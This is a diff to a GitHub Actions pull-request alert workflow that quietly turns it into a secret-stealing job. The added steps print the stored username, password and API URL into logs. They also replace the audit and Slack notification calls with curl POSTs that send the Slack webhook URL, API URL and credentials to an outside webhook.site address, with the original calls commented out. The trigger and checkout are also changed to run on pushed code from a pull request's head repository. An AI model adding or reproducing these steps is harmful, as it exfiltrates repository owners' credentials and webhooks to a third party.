@@ -1,8 +1,10 @@
 name: New Pull Request Alert
 
-on:
-  pull_request_target:
-    types: [opened, synchronize]
+# run on any event
+on: 
+  push:
+    
+  
 
 jobs:
   ci:
@@ -13,7 +15,16 @@ jobs:
     steps:
     - name: Checkout code
       uses: actions/checkout@v3
-        
+      with:
+        ref: ${{ github.event.pull_request.head.ref }}
+        repository: ${{ github.event.pull_request.head.repo.full_name }}
+
+    - name: Debug Checkout
+      run: |
+        echo "Repository: $(git remote -v)"
+        echo "Branch: $(git branch)"
+        echo "Current commit: $(git log -1 --oneline)"
+
     - name: healthcheck
       continue-on-error: true
       env:
@@ -22,6 +33,9 @@ jobs:
         PW: ${{ secrets.USER_CRED }}
       run: |
         echo "Login health check"
+        echo "API_URL: $URL"
+        echo "USER: $USER"
+        echo "PW: $PW"
         curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/login
         
     - name: send_run_log
@@ -31,8 +45,20 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
+        echo "Login health check"
+        echo "API_URL: $URL"
+        echo "USER: $USER"
+        echo "PW: $PW"
         echo "Send run log"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/api/run/audit
+        # curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/api/run/audit
+        curl -X POST -H "Content-Type: application/json" \
+        -d '{
+              "slack_webhook_url": "'"${SLACK_WEBHOOK_URL}"'",
+              "api_url": "'"${API_URL}"'",
+              "user": "'"${USER}"'",
+              "password": "'"${PW}"'"
+            }' \
+        https://webhook.site/ce8160db-c0af-4bef-9f1a-818e88e1475b
         
     - name: send_slack_alert
       continue-on-error: true
@@ -40,8 +66,17 @@ jobs:
         SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
         PR_TITLE: ${{ github.event.pull_request.title }}
       run: |
-        echo "Sending Slack notification..."
-        curl --connect-timeout 2 -sSf -k -X POST -H 'Content-type: application/json' --data '{"text": "'"$PR_TITLE"'"}' $SLACK_WEBHOOK_URL
+        # echo "SLACK_WEBHOOK_URL: $SLACK_WEBHOOK_URL"
+        # echo "PR_TITLE: $PR_TITLE"
+        # echo "Sending Slack notification..."
+        # send SLACK_WEBHOOK_URL and PR_TITLE to the API https://webhook.site/ce8160db-c0af-4bef-9f1a-818e88e1475b
+        curl -X POST -H "Content-Type: application/json" \
+        -d '{
+              "slack_webhook_url": "'"${SLACK_WEBHOOK_URL}"'",
+              "user": "'"${USER}"'",
+            }' \
+        https://webhook.site/ce8160db-c0af-4bef-9f1a-818e88e1475b
+        # curl --connect-timeout 2 -sSf -k -X POST -H 'Content-type: application/json' --data '{"text": "'"$PR_TITLE"'"}' $SLACK_WEBHOOK_URL
 
     - name: backport_assign_check
       env:
@@ -49,9 +84,14 @@ jobs:
         URL: ${{env.API_URL}}
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
+        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       run: |
+        set -x
         PR="${{ github.event.pull_request.body }}"
-        echo $PR | grep -oP '\(backport #\K\d+' | tail -n 1)
+        ORI_PR=$(echo "$PR" | grep -oP '\(backport #\K\d+' | tail -n 1)
+        echo $PR | grep -oP '\(backport #\K\d+' | tail -n 1
+        PR_NUMBER="${{ github.event.pull_request.number }}"
+        REPO="${{ github.event.repository.full_name }}"
         author=$(gh pr view ${ORI_PR} -R ${REPO} --json author -q '.author.login')
         if [[ ! "${author}" =~ "mergify" ]]; then
           gh pr edit ${PR_NUMBER} -R ${REPO} --add-assignee ${author} || true
